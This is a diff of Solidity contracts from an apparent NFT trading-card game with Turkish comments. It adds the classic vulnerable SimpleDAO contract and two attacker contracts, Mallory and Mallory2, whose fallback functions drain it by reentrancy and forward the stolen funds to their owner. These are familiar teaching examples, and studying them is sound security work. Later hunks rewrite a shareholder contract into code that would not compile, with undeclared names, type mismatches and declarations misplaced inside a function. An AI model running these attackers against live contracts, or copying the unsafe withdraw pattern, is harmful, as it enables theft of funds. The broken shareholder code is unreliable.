@@ -31,6 +31,210 @@ contract PaniniERC721Token is ERC721BasicToken {
     
 }
 
+contract PaniniERC721TokenOfContract is PaniniERC721Token {
+ 
+    function mint(address _to, uint256 _cardId) public{
+        super._mint(_to, _cardId);
+    }
+    
+}
+
+contract paniniTokenTest {
+    PaniniERC721TokenOfContract nft;
+    uint256 nextTokenId;
+    
+    function paniniTokenTest() public {
+        //nft = new PaniniERC721Token();
+    }
+    
+    function mint() public{
+        nextTokenId = nextTokenId + 1;
+      
+        nft.mint(this, nextTokenId);
+    }
+    
+    
+    function balanceOf(address _owner) public view returns (uint256) {
+        return nft.balanceOf(_owner);
+    }
+
+    function ownerOf(uint256 _cardId) public view returns (address) {
+        return nft.ownerOf(_cardId);   
+    }
+  
+    function exists(uint256 _cardId) public view returns (bool) {
+        return nft.exists(_cardId);
+    }
+
+    function approve(address _to, uint256 _cardId) public {
+        nft.approve(_to, _cardId);
+    }
+
+    function getApproved(uint256 _cardId) public view returns (address) {
+        return nft.getApproved(_cardId);
+    }
+
+    function setApprovalForAll(address _to, bool _approved) public {
+        nft.setApprovalForAll(_to, _approved);
+    }
+
+    function isApprovedForAll(address _owner, address _operator) public view returns (bool) {
+        return nft.isApprovedForAll(_owner, _operator);
+    }
+
+    function transferFrom(address _from, address _to, uint256 _cardId) public {
+        return nft.transferFrom(_from, _to, _cardId);
+    }
+    
+    function safeTransferFrom(address _from, address _to, uint256 _cardId) public {
+        nft.safeTransferFrom(_from, _to, _cardId, "");
+    }
+
+    
+}
+
+
+pragma solidity ^0.4.2;
+
+contract SimpleDAO {   
+  mapping (address => uint) public credit;
+  uint public bal;
+    
+  function donate(address to) payable {
+    credit[to] += msg.value;
+    bal = address(this).balance;
+  }
+    
+  function withdraw(uint amount) {
+    if (credit[msg.sender]>= amount) {
+      bool res = msg.sender.call.value(amount)();
+      credit[msg.sender]-=amount;
+      bal = address(this).balance;
+    }
+  }  
+
+  function queryCredit(address to) returns (uint){
+    return credit[to];
+  }
+}
+
+
+contract Mallory {
+  SimpleDAO public dao;
+  address owner;
+    uint public bal;
+
+  function Mallory(SimpleDAO addr){ 
+    owner = msg.sender;
+    dao = addr;
+  }
+  
+   function donate(address to) payable {
+    bal = address(this).balance;
+  }
+  
+  function setBal() public {
+      bal = address(this).balance;
+  }
+  
+  function getJackpot() payable{ 
+    bool res = owner.send(address(this).balance); 
+  }
+
+  function() payable { 
+    dao.withdraw(dao.queryCredit(this)); 
+  }
+}
+
+contract Mallory2 {
+  SimpleDAO public dao;
+  address owner; 
+  bool public performAttack = true;
+  uint public bal;
+  
+    
+  function setBal() public {
+      bal = address(this).balance;
+  }
+  
+  function Mallory2(SimpleDAO addr){
+    owner = msg.sender;
+    dao = addr;
+  }
+    
+  function attack() payable{
+    dao.donate.value(1)(this);
+    dao.withdraw(1);
+  }
+
+  function getJackpot(){
+    dao.withdraw(dao.balance);
+    bool res = owner.send(this.balance);
+    performAttack = true;
+  }
+
+  function() payable {
+    if (performAttack) {
+       performAttack = false;
+       dao.withdraw(1);
+    }
+  }
+}
+
+
+contract MapTest{
+    
+    uint[] public arr;    
+    mapping(uint => uint) public hash;
+
+    function addElem(uint key, uint val) public {
+        hash[key] = val;    
+    }
+    
+    function deleteElem(uint key) public {
+        hash[key] = 0;    
+    }
+
+    function deleteElem1(uint key) public {
+        delete hash[key];    
+    }
+
+}
+
+//save.
+pragma solidity ^0.4.21;
+
+//import "github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC721/ERC721Token.sol";
+//not: yukaridaki token ozelliklerini kod icerisinde sagliyoruz. Bu yuzden basic gas verimi icin tercih edildi.
+import "github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC721/ERC721BasicToken.sol";
+
+//randomize icin gerekli olacak.
+//import "github.com/oraclize/ethereum-api/oraclizeAPI.sol";
+
+//Panini ERC721Token
+contract PaniniERC721Token is ERC721BasicToken {
+ 
+    // Token name
+    string internal name_;
+    
+    // Token symbol
+    string internal symbol_;
+
+    function PaniniERC721Token() public {
+        name_ = "Panini Token";
+        symbol_ = "Panini Symbol";
+    }
+    
+    function name() public view returns (string) {
+        return name_;
+    }
+    
+    function symbol() public view returns (string) {
+        return symbol_;
+    }
+    
+}
+
 //this test failed.
 //   msg.sender = paniniTokenTest.address
 //   thus, in approve method, require(msg.sender == owner) returns false
@@ -320,11 +524,9 @@ contract UsingShareholder {
 
     event WithdrawOwnerBalance(address credit, uint256 amount);
     event WithdrawShareholderBalance(address credit, uint256 amount);
-    mapping (address => Shareholder.Data) shareholderData;
-    address[] shareholders;
-    mapping (address => uint256) shareHoldersIndex;
-    mapping (address => address) ownerToPendingShareholders;
-    mapping (address => address) pendingShareholdersToOwner;
+    mapping (address => Shareholder.Data) shareholders;
+    address[] shareholderAddressList;
+    mapping (address => address) pendingShareholders;
 
     event ShareholderOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -335,7 +537,7 @@ contract UsingShareholder {
     Mutex mutex;
 
     modifier __isOnlyOwnerOfShareholder() {
-        require(shareholderData[msg.sender].owner != msg.sender);
+        require(shareholders[msg.sender].owner != msg.sender);
         _;
     }
 
@@ -352,7 +554,7 @@ contract UsingShareholder {
     }
 
     function isShareHolder(address _address) internal returns(bool) {
-        if(shareholderData[_address].owner != _address) {
+        if(shareholders[_address].owner != _address) {
             return true;
         }
         return false;
@@ -364,30 +566,29 @@ contract UsingShareholder {
 
         uint nextTotalPercentage = totalPercentage + _percentage;
         if(nextTotalPercentage <= 100) {
-            shareholderData[_address] = Shareholder.Data(_address, _percentage, 0);
-            shareHoldersIndex[_address] = shareholders.length;
-            shareholders.push(_address);
+            shareholders[_address] = Shareholder.Data(_address, _percentage, 0);
             totalPercentage = nextTotalPercentage;
+            
         }                            
-    }   
+    }
     
-    //distributeBalance
-    function distributeBalance(uint256 _amount) internal{
+    //dealBalance
+    function dealBalance(uint256 _amount) internal{
         if(_amount != 0) {
 
             uint256 amount = _amount;
             uint256 onePercentOfAmount = amount / 100;
             
-            for(uint256 i = 0; i < shareholders.length; i++) {
-                address shareholder = shareholders[i];
-                uint percentage = shareholderData[shareholder].percentage;
+            for(uint256 i = 1; i < shareholders.length; i++) {
+
+                uint percentage = shareholders[i];
                 uint addBalance = percentage * onePercentOfAmount;
                 
-                shareholderData[shareholder].balance += addBalance;
+                Shareholders[i].balance += addBalance;
                 amount -= addBalance;
             }        
 
-            //note: hic bir zaman total percentage 100'u gecmeyecegi icin,
+            //note: hic bir zaman total percente 100'u gecmeyecegi icin,
             // amount for dongusu sonunda pozitif olacaktir.
             // kontrolu addShareHolder'da yapilmisti.
             ownerBalance += amount;
@@ -396,8 +597,9 @@ contract UsingShareholder {
     
     function withdrawShareholderBalance() __isOnlyOwnerOfShareholder public payable {
         mutex.enter();
-        uint256 balance = shareholderData[msg.sender].balance;
-        shareholderData[msg.sender].balance = 0;
+        uint256 id = shareHoldersIndex[msg.sender];
+        uint256 balance = shareholders[id].balance;
+        shareholders[id].balance = 0;
         if(!msg.sender.call.value(balance)()) { throw;}
         emit WithdrawShareholderBalance(msg.sender, balance);
         mutex.left();        
@@ -414,55 +616,47 @@ contract UsingShareholder {
 
     function transferShareholderOwnership(address _newOwner) __isOnlyOwnerOfShareholder public {        
         require (msg.sender != _newOwner);  
-        ownerToPendingShareholders[msg.sender] = _newOwner;
+        pendingShareholdersIndex[_newOwner] = pendingShareholders.length;
+        pendingShareholders.push(_newOwner);
         pendingShareholdersToOwner[_newOwner] = msg.sender;
     }
 
     function claimShareholderOwnership() public {
-
-        address owner = pendingShareholdersToOwner[msg.sender];
-        address pendingOwner = ownerToPendingShareholders[owner];
-
+        uint256 index = pendingShareholdersIndex[msg.sender];
+        address pendingOwner = pendingShareholders[index];
         if(pendingOwner == msg.sender && pendingOwner != address(0)) {
+            uint256 owner = pendingShareholdersToOwner[msg.sender];
+            uint256 ownerId = shareHoldersIndex[owner];                
+
             //delete all data about pending owner
-            delete pendingShareholdersToOwner[msg.sender];
-            delete ownerToPendingShareholders[owner];       
+            delete pendingShareholdersIndex[msg.sender];
+            delete pendingShareholders[index];                      
+            delete pendingShareholdersToOwner[msg.sender]; 
 
             //pendingOwner is has another acc.
             if(isShareHolder(pendingOwner)) {
                 //balance add.
                 //percentage add.
-                shareholderData[pendingOwner].balance += shareholderData[owner].balance;               
-                shareholderData[pendingOwner].percentage += shareholderData[owner].percentage;
+                uint256 pendingId = shareHoldersIndex[msg.sender];
+                
+                shareholders[pendingId].balance += shareholders[ownerId].balance;               
+                shareholders[pendingId].percentage += shareholders[ownerId].percentage;
 
                 //delete old acc.
-                uint256 index = shareHoldersIndex[owner];
-                uint256 lastIndex = shareholders.length - 1; //bu scope'ta her zaman > 0                
-                address lastAddress = shareholders[lastIndex];
-
-                Shareholders[index] = lastAddress;
-                Shareholders[lastIndex] = address(0);
-                Shareholders.length--;
-
-                shareHoldersIndex[owner] = 0;
-                shareHoldersIndex[lastAddress] = index;
+                delete shareHoldersIndex[owner];
+                delete shareholders[ownerId];
             } else {
                 //owner vs degistir.
-                mapping (address => Shareholder.Data) shareholderData;
+    Shareholder.Data[] shareholders;
+    mapping (address => uint256) shareHoldersIndex;
+    address[] pendingShareholders;
+    mapping (address => uint256) pendingShareholdersIndex;
+    mapping (address => address) pendingShareholdersToOwner;
 
-                address[] shareholders;
-                mapping (address => uint256) shareHoldersIndex;
 
-                shareholderData[pendingOwner].owner = pendingOwner;
-                shareholderData[pendingOwner].balance = shareholderData[owner].balance;               
-                shareholderData[pendingOwner].percentage = shareholderData[owner].percentage;
 
-                uint256 index = shareHoldersIndex[owner];
-                shareholders[index] = pendingOwner;
             }
             
-            delete shareholderData[owner];
-
             emit ShareholderOwnershipTransferred(owner, pendingOwner);
         }
     }
@@ -1004,7 +1198,7 @@ contract UsingPlayer is UsingGameCore{
 
         uint256 price = computePriceOfPackage(_numberOfPackage);
         require (price < msg.value);
-        distributeBalance(msg.value);        
+        dealBalance(msg.value);        
 
         createPackage(msg.sender);
 
